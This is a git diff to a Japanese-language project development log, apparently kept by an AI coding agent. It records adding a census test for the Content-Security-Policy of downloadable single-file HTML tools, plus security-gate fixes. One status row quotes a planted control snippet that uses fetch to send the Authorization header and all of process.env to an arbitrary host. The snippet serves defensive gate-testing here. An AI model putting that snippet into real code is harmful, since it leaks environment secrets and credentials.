@@ -7,6 +7,74 @@
 >
 > 大幅な変更を加えた時は **このファイルも合わせて更新** してください。
 
+## パス 344 (2026-09-20) — 昨日書いた法則の母集団を測ったら、まだ 4 本外に居た
+
+### 見つけ方 —— 自分が足した法則を、自分の木に当てる
+
+パス 343 で `distributed-code-same-gates` (配るコードも自分の門を通す) を足した。
+**法則を足したら母集団を測る**、というのがパス 342 の `outside-scope-gets-its-own-census`
+の言っていることなので、そのまま当てた。
+
+「CSP を書いている場所」を数えると **14 ファイル**。うち builder は **8 本**:
+
+```
+  pages.yml が publish する 4 本   landing / 相談デモ / 熟議デモ / 研究デモ   ← 門が当たる
+  利用者がダウンロードする 4 本    経営書類スタジオ / 業務自動化ダッシュボード /
+                                  就業規則メーカー / 電子定款メーカー        ← 誰も見ていない
+```
+
+後者 4 本は `dist/*.html` の単一ファイルで、利用者が開いてそのまま使う (印刷まで
+オフラインで完結する)。**CI では 1 度も組まれない。** 就業規則メーカーと電子定款メーカーに
+至っては **tests=0 / gates=0 / workflows=0** —— ビルドが通ることすら誰も見ていなかった。
+
+### 実測 —— 今日は 4 本とも通る
+
+```
+  node scripts/lint-artifact-csp.cjs --document dist/経営書類スタジオ.html …(4 本)
+    → Checked 4 artifact(s) の CSP / ✅ プロファイルどおりです / exit 0
+```
+
+**欠けていたのは守りではなく、それを保つ物のほうだった。** 4 本の CSP は
+`default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:;` で、
+`script-src 'unsafe-inline'` は単一ファイル道具としては正しいが、その正しさは
+**注入口が無いこと**に依っている。実測: 4 本の出力はいずれも `textContent` /
+`createElement` だけで、`innerHTML` / `outerHTML` / `insertAdjacentHTML` は **0 件**。
+そこは `lint:forbidden` の規則が `scripts/` を含めて留めている (抑止台帳に 1 件も無い)
+ので、**同じ判定を 2 度書かない** —— この census は CSP だけを見る。
+
+### 直し
+
+`artifactCspCensus.test.ts`:
+
+- 母集団は git から (`build-*.cjs` のうち CSP メタを書く物)。床 8。
+- 台帳は**両方向** —— 新しい builder が CSP を書けば落ち、台帳の行が CSP をやめても落ちる。
+- 各行の CSP を**門の `evaluate` を借りて**判定する (写すと比べているのが写しになる ——
+  `proxyWorkerParity` と同じやり方)。
+- `shipped: 'pages'` の行は `pages.yml` の CSP ステップに実在し、`shipped: 'download'` の行は
+  `package.json` に `build:*` として実在する。
+- 理由の欄に**保留の決まり文句を置けない** (パス 336 の規則)。
+  ★ **最初に書いた台帳は「同上。」で 3 行埋めており、この検査が鳴って書き直させた。**
+
+対照 (どちらも鳴ることを実測):
+
+```
+  配る HTML の CSP を緩める (default-src → *)  → ❌ その 1 本の判定が落ちる
+  台帳に無い builder が CSP を書く             → ❌ 母集団の両方向が落ちる
+```
+
+### なぜ「CI で 4 本も組む」ようにしなかったか
+
+Actions 分の節約が CLAUDE.md の明示された方針で、`e2e` すら既定で走らない。
+4 本は**雛形の CSP が固定文字列**なので、組まなくても門の判定は同じ答えを出す。
+組む側 (`build:*`) が実在することは台帳が別に見る。
+
+### 検証
+
+`npm test` 17,694 件 ✅ / `verify:all` 37 ゲート ✅ / 出荷物 **11,930,723 B / 3,343,244 B
+(byte 単位で不変** —— 検査と文書しか触っていない。両方を組んで実測)。
+
+---
+
 ## パス 343 (2026-09-20) — 利用者へ配る Worker だけが、上限の無い読みを持っていた
 
 ### 見つけ方 —— 「自分の門を、配るコードにも掛けているか」
@@ -6066,6 +6134,7 @@ derivedFrom を丸ごと表にしてテストファイルに置き、
 
 | 項目 | 状態 |
 |---|---|
+| 配る HTML 4 本がどのゲートにも触られていなかった (パス 344) | ✅ パス 343 で足した法則 `distributed-code-same-gates` の**母集団を測ったら、まだ 4 本外に居た**。CSP を書く builder は実測 **8 本**で、`lint:artifact-csp` が CI で当たるのは `pages.yml` が publish する 4 本だけ。残り 4 本 (経営書類スタジオ / 業務自動化ダッシュボード / 就業規則メーカー / 電子定款メーカー) は**利用者がダウンロードして開く単一ファイル**で CI では 1 度も組まれず、後 2 本は tests=0 / gates=0 / workflows=0 だった。**今日は 4 本とも `document` プロファイルを通る** (実測 exit 0) —— 欠けていたのは**それを保つ物**。母集団と 8 本それぞれの合否を `artifactCspCensus.test.ts` が**門の `evaluate` を借りて**両方向に留めた (対照 2 方向)。注入口は `lint:forbidden` が `scripts/` を含めて 0 件で留めているので数えない (実測でも 4 本は `textContent` だけ)。★ 最初に書いた台帳は「同上。」で 3 行埋めており、**自分で足した「保留を置けない」規則が鳴って書き直させた** |
 | 配る Worker だけが上限の無い読みを持っていた (パス 343) | ✅ `docs/PROXY_EXAMPLE.md` の Worker (利用者が自分の Cloudflare へ貼る・**全サービスのトークンが封筒で通る**) が `await upstream.text()` を素で置いていた。実測: **64 MiB の応答で rss +223 MiB / 2,034 ms**・256 MiB で **rss +956 MiB / 6,787 ms**、上限つきなら 26〜32 ms で断り。**Workers の isolate は 128 MiB** なので 64 MiB 1 つで Worker ごと落ちる —— アプリ側の上限は**Worker が返した封筒**に掛かるので、先に落ちる限り一度も効かない。**同じファイルの 20 行上が `MAX_REDIRECTS` の理由に「無制限に追うと CPU time と subrequest 枠を使い切る」と書いていた** (資源の枯渇をホップ数の軸でだけ見ていた)。§3・§3.1 は SSRF に極めて詳しいのに大きさには 1 語も無し。`readCappedText` を足し、`MAX_UPSTREAM_BYTES` とアプリ側の `MAX_HTTP_RESPONSE_BYTES` を**md から切り出して実際に走らせるパリティ検査**で結んだ (対照 3 種)。見出しの「約 290 行」が実測 325 行だったのも機械に留めた。法則 89 本目 `distributed-code-same-gates` |
 | 37 ゲート全部が素通りする経路 (パス 342) | ✅ `lint:network-targets` は `ROOTS = ['src']` で、`scripts/` (83 ファイル) が丸ごと視界の外だった。対照: CI で走る script へ `fetch(\`https://${host}/v1/collect\`, { headers: { Authorization }, body: JSON.stringify({ env: process.env }) })` を植えると **37 ゲートすべてが exit 0**、同じコードを `src/` へ置くと鳴る —— **差は検出器ではなく走査範囲だけ**。`release.yml` の梱包ステップは署名鍵 4 本と `GH_TOKEN` を env に持つ。**直し方は「広げる」ではなかった** —— 木全体へ広げると 20 件出るが**真陽性 0 件** (全部ゲート自身の self-test の標本)、かつ `src` の外の実物 3 件は**どれも送り先が素の識別子**で `BARE_SEND` が意図して見ない (広げても 0 件見える)。第 3 の母集団として**別の検出器 + 全件台帳** (両方向・床 60・git に聞く母集団) を足し、3 件の守り (SW は送り先を作らない / 毎ホップ DNS まで見る / loopback 固定) を書いた。`SCAN_EXT` の「src はすべて TypeScript」という**循環した理由**も直した。★ **この門は法則 `scan-whole-tree` の執行者として台帳に載っていた** —— 守らせる側が自分で破っており、それを見る機械は無かった。法則 88 本目 `outside-scope-gets-its-own-census` を足した |
 | `npm test` が CI と違う答えを出していた (パス 341) | ✅ パス 340 を push したら**ローカル全件緑・CI だけ赤**になった。差は「その時点で追跡されていたか」だけ —— `absenceSampleCensus` の母集団が `git ls-files` で、**`git add` していない新しい検査ファイルが 1 つも映らなかった**。規約が最も効くのは「検査を新しく書いた瞬間」なので、**効かせたい時にだけ黙る**形だった。対照: 未追跡の検査に標本なしの `not.toMatch` を置くと、`--cached --others --exclude-standard` では**捕まえ**、`git ls-files` だけでは**見えない**。母集団を直し、指定の綴りと走査の生死を ★ で留めた。パス 340 の私の `not.toMatch` にも標本を付けた。**同じ `git ls-files` を使う 5 か所のうち直したのは 1 つだけ** —— 残り 4 つ (repo-size / lint:shell / verify:arch ×2) は「未追跡を含めない」ことが名乗りどおりで、含めると意味が変わる。★ 自戒: 対照を戻すときに **未コミットの編集が在るファイルへ `git checkout --`** を走らせて自分の直しを消した(規則が名指しで禁じている操作。`echo` が無条件で「restore skipped」と刷っていたため気付くのが遅れた) |
